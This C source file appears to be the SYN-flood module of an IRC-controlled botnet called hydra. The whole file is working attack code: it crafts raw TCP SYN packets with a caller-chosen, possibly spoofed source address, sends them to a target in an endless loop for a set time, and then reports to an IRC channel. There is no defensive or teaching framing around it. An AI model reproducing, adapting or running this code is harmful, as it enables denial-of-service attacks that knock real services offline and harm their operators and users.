/*
 * hydra_synf.c
 * questions: esaltato, <esaltato@autistici.org>.
 *
 */

#include "../include/hydra_hds.h"

/* cmd_call_synf(sock_t *, unsigned int, unsigned_int, unsigned short, int) */
/* function to start attack with sended hostname.                           */
void cmd_call_synf(sock_t *sp, unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, int ntime)
{
  int i;
  int tcp_socket;
  struct sockaddr_in sin;
  int sinlen;
  unsigned int vt = true;
  time_t start = time(NULL);
            
  /* form ip packet */
  send_tcp.ip.ihl = 5;
  send_tcp.ip.version = 4;
  send_tcp.ip.tos = 0;
  send_tcp.ip.tot_len = htons(40);
  send_tcp.ip.id = getpid();
  send_tcp.ip.frag_off = 0;
  send_tcp.ip.ttl = 255;
  send_tcp.ip.protocol = IPPROTO_TCP;
  send_tcp.ip.check = 0;
  send_tcp.ip.saddr = source_addr;
  send_tcp.ip.daddr = dest_addr;
   
  /* form tcp packet */
  send_tcp.tcp.source = getpid();
  send_tcp.tcp.dest = htons(dest_port);
  send_tcp.tcp.seq = getpid();   
  send_tcp.tcp.ack_seq = 0;
  send_tcp.tcp.res1 = 0;
  send_tcp.tcp.doff = 5;
  send_tcp.tcp.fin = 0;
  send_tcp.tcp.syn = 1;
  send_tcp.tcp.rst = 0;
  send_tcp.tcp.psh = 0;
  send_tcp.tcp.ack = 0;
  send_tcp.tcp.urg = 0;
  send_tcp.tcp.window = htons(512);
  send_tcp.tcp.check = 0;
  send_tcp.tcp.urg_ptr = 0;
   
  /* setup the sin struct */
  sin.sin_family = AF_INET;
  sin.sin_port = send_tcp.tcp.source;
  sin.sin_addr.s_addr = send_tcp.ip.daddr;   
   
  /* (try to) open the socket */
  tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if(tcp_socket < 0)
    exit(1);
   
  for (;;)
  {
    /* set fields that need to be changed */
    send_tcp.tcp.source++;
    send_tcp.ip.id++;
    send_tcp.tcp.seq++;
    send_tcp.tcp.check = 0;
    send_tcp.ip.check = 0;
      
    /* calculate the ip checksum */
    send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);

    /* set the pseudo header fields */
    pseudo_header.source_address = send_tcp.ip.saddr;
    pseudo_header.dest_address = send_tcp.ip.daddr;
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_TCP;
    pseudo_header.tcp_length = htons(20);
    bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
    send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
    sinlen = sizeof(sin);
    sendto(tcp_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sinlen);

	  if (vt >= 50) 
	  {
	  	if (time(NULL) >= start + ntime) 
      {
        arg_send(sp->s_fd, end_synflood, irc_room);
        max_pids--;

        exit(0);
      }

      vt = true;
    }

    vt++;
  }

  close(tcp_socket);
  exit(0);
}
